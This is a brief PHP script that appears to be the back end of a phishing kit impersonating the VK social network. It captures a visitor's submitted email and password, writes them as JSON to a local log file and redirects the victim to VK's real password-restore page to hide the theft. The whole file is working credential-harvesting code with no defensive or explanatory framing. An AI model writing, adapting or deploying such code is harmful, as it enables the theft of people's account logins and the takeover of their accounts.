<?php

header('Location: https://vk.com/restore/');
$data = array('site' => 'Vk',
  'user' => $_POST['email'],
  'pass' => $_POST['pass']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>